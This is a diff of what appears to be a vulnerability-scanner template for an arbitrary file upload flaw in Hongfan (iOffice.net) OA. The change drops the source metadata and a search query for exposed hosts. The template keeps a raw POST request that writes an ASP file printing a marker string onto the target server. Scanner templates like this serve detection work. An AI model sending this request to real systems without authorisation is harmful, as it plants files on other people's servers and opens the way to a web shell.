@@ -3,12 +3,8 @@ info:
   name: 红帆OA iorepsavexml.aspx任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fviogpbhbddhg4eg'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fviogpbhbddhg4eg
-    fofa: title="iOffice.net"
 http:
 - raw:
   - 'POST /iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=dudesuite.asp&filepath=/upfiles/rep/pic/ HTTP/1.1
@@ -30,8 +26,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     <% Response.Write("dudesuite") %>
